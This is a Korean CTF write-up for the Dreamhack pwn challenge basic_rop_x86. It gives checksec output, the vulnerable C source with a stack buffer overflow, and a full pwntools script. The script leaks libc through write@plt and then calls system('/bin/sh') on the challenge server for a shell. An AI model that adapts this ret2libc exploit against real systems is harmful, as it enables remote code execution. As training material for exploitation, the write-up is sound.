# basic_rop_x86 - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: basic_rop_x86.c, basic_rop_x86(ELF), libc.so.6
- tools: gdb(pwndbg), checksec, ROPgadget   
## Brief Description
이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x86)의 바이너리와 소스 코드가 주어집니다.
Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec --file=basic_rop_x86
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
## Vulnerability
### BOF(Buffer Overflow)
``` c
char buf[0x40] = {};

read(0, buf, 0x400);
```
`buf`의 크기는 0x40인 반면, `read`로 `buf`에서 읽어오는 크기는 0x400로 한참 초과하여 BOF 취약점이 발생한다.  
## Exploit
### Strategy
PIE와 Canary가 비활성화 되어있고, BOF 취약점이 존재해 ROP 공격이 가능한 환경이다. 32bit 환경에서는 레지스터가 아닌 스택에서 값을 pop하여 인자로 전달하며 순서 또한 반대다. x64 ROP와의 또 다른 차이점은 pop 횟수만 중요할 뿐, 어떤 레지스터에 값이 저장되는지는 크게 중요하지 않다. 이번에는 GOT를 덮어쓰지 않고 `system`을 직접 호출할 것이다.  
여담으로, libc.so.6는 아키텍처에 따라 다르다(당연하죠?). 이걸 깜빡하고 libc 버전을 확인하지 않은 채 문제를 풀다가 몇십 분 동안 삽질했다. 앞으로 아키텍처 및 버전 확인을 좀 잘 해야겠다.
### ROP gadgets
- pop; let
- pop3; let
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x4 |
| ebp |  |
| dummy | -0x4 |
| buf | -0x44 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 18581)
context.arch = "i386"

e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')
r = ROP(e)

write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']
main = e.symbols['main']

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh_offset = list(libc.search(b"/bin/sh"))[0]

pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]


# Exploit
payload = b''
payload += b'A' * 0x48 

# write(1, read_got, 4) -> libc base leak
payload += p32(write_plt) 
payload += p32(pop3_ret) 
payload += p32(1) + p32(read_got) + p32(4) 
payload += p32(main) # ret2main

p.send(payload)
p.recvuntil(b'A' * 0x40)

read = u32(p.recvn(4))
libc_base = read - read_offset
system = libc_base + system_offset
binsh = libc_base + sh_offset
log.info(f'system: {system}')
log.info(f'sh: {binsh}')

# system("/bin/sh") 
payload = b''
payload += b'A' * 0x48
payload += p32(system) 
payload += p32(pop_ret) # GOT overwrite가 아닌 직접 호출
payload += p32(binsh)

p.send(payload)
p.recvuntil(b'A' * 0x40)

# interactive
p.interactive()
```